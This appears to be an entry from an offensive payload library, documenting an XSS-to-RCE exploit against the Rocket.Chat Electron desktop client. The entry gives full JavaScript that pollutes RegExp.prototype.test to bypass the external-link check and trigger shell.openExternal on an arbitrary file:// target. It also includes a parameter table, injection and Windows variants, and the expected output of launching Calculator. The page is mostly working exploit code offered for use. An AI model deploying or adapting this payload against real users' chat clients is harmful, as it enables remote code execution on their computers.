---
data: >-
  (function(){const payload =`file:///System/Applications/Calculator.app`;var
  counter =0;var target = document.createElement(`a`);
  target.setAttribute(`href`, payload); document.body.appendChild(target);var
  old_test =RegExp.prototype.test;RegExp.prototype.test=function(s){if(s ===
  payload){return(++counter >3);}return old_test.call(this, s);};
  target.dispatchEvent(new MouseEvent(`click`));})();
tags:
  - prototype-pollution
  - rce
type: command
output: null
executor: javascript
platforms:
  - Electron
  - Desktop
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.633Z'
id: 786137cd-e23f-4d21-9211-fb78d4e66d50
verified: false
validated: true
submitted: true
---
# rocket-chat-prototype-pollution-payload

## Command

```javascript
(function(){const payload =`file:///System/Applications/Calculator.app`;var counter =0;var target = document.createElement(`a`); target.setAttribute(`href`, payload); document.body.appendChild(target);var old_test =RegExp.prototype.test;RegExp.prototype.test=function(s){if(s === payload){return(++counter >3);}return old_test.call(this, s);}; target.dispatchEvent(new MouseEvent(`click`));})();
```

## Description

This JavaScript payload, injected via XSS in the Rocket.Chat Electron webview, creates a synthetic anchor element with an arbitrary file:// URL, pollutes RegExp.prototype.test to bypass the external link regex check after 3 calls, and dispatches a click event to trigger electron.shell.openExternal for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `payload` | Target URL (e.g., file:///System/Applications/Calculator.app for macOS calc) | Yes |
| `counter` | Tracks regex calls to delay bypass | Yes |
| `s` | String input to overridden test() method | Internal |
| `old_test` | Original RegExp.prototype.test for fallback | Yes |
| `target` | Created <a> element | Internal |

## Examples

### Basic Usage

```javascript
// Inject in XSS context
eval('(function(){...})()');
```

### Advanced Usage

```javascript
// For Windows calc
(function(){const payload =`file:///C:/Windows/System32/calc.exe`; /* rest unchanged */ })();
```

## Expected Output

Opens the target application on the host OS (e.g., Calculator launches on macOS), enabling interactions like 7*191=1337 to confirm RCE. No console errors; prototype restored optionally.

## Related

- [[procedures/Inject-JavaScript-Payload-for-Prototype-Pollution]]
- [[procedures/Trigger-Payload-Execution-via-Page-Load]]
